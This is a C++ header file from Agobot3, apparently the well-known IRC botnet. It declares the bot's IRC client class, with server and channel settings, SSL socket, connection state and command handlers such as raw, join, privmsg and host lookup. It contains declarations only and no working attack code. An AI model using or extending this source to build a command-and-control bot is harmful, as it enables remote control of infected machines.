/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __IRC_H__
#define __IRC_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "ssllib.h"
#include "cthread.h"

typedef struct irc_server_s
{	cvar	si_nickprefix;
	cvar	si_nickend;
	cvar	si_servpass;
	cvar	si_server;
	cvar	si_port;
	cvar	si_chanpass;
	cvar	si_mainchan;
	cvar	si_usessl;
} irc_server;

class CIRC : public CThread, public CCommandHandler
{
public:
	CIRC();
	virtual ~CIRC() { };
	virtual void *Run();

	void	Init();

	bool	HandleCommand(CMessage *pMsg);

	bool	SendRaw(char *szMsg);
	bool	SendRawFormat(const char *szFmt, ...);
	bool	SendMsg(bool bSilent, bool bNotice, char *szMsg, char *szDst);
	bool	SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt, ...);

	void	Fail();
	void	Disconnect();

	CString	NetInfo();

#ifndef AGOBOT_NO_OPENSSL
	CSSLSocket			m_csslSocket;	// The SSL socket
#endif // AGOBOT_NO_OPENSSL

	bool				m_bConnected;	// Am I connected ?
	bool				m_bJoined;		// Have I joined the channel ?
	bool				m_bRunning;		// Am I still running ?
	int					m_sSocket;		// The socket connected to the server

	int					m_iFailCount;	// Number of failed connections to the server
	int					m_iServerNum;	// The current server index in vector
	unsigned long		m_lLastRecv;	// Last recv time for timeout

	CString				m_sLocalHost;	// The local hostname
	CString				m_sLocalIp;		// The local ip
	unsigned long		m_lLocalAddr;	// The local address as unsigned long

	command				m_cmdDisconnect, m_cmdAction, m_cmdNotice, m_cmdGetEdu, m_cmdGetHost, m_cmdJoin, \
						m_cmdMode, m_cmdNetInfo, m_cmdPart, m_cmdPrivMsg, m_cmdQuit, m_cmdRaw, \
						m_cmdReconnect, m_cmdServer;

	vector<irc_server*>	m_vServers;
};

#endif // __IRC_H__
